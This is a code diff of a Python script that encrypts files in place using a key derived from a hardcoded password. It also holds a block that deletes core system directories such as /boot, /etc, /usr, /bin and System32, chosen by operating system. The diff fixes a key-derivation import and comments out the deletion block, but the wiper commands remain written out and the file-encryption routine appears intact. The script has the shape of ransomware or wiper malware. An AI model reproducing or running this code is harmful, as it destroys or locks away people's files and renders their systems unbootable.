@@ -23,7 +23,8 @@ import base64
 import getpass
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives import hmac
+from cryptography.hazmat.primitives.hashes import SHA256
+from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import shutil
@@ -56,13 +57,7 @@ else:
 
     # Generate a key for encryption
     salt = os.urandom(16)
-    kdf = PBKDF2HMAC(
-        algorithm=hmac.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-        backend=default_backend()
-    )
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
     password = "2pI34n%FrOq*0189HqPzR7&T@z"
     key = kdf.derive(password.encode())
 
@@ -88,15 +83,15 @@ else:
                     file.write(encrypted_content)
     # The following lines attempt to remove critical system files based on the detected OS,
     # but they are commented out here to prevent accidental execution and system damage.
-    if platform.system() == "Linux":
-        shutil.rmtree("/boot")
-        shutil.rmtree("/etc")
-        shutil.rmtree("/usr")
-        shutil.rmtree("/bin")
-    elif platform.system() == "Windows":
-        os.remove("C:\Windows\System32")
-    elif platform.system() == "Darwin":
-        shutil.rmtree("/System/Library/CoreServices/Boot")
-        shutil.rmtree("/etc")
-        shutil.rmtree("/usr")
-        shutil.rmtree("/bin")
+  #  if platform.system() == "Linux":
+  #      shutil.rmtree("/boot")
+  #      shutil.rmtree("/etc")
+  #      shutil.rmtree("/usr")
+  #      shutil.rmtree("/bin")
+  #  elif platform.system() == "Windows":
+  #      os.remove("C:\Windows\System32")
+  #  elif platform.system() == "Darwin":
+  #      shutil.rmtree("/System/Library/CoreServices/Boot")
+  #      shutil.rmtree("/etc")
+  #      shutil.rmtree("/usr")
+  #      shutil.rmtree("/bin")
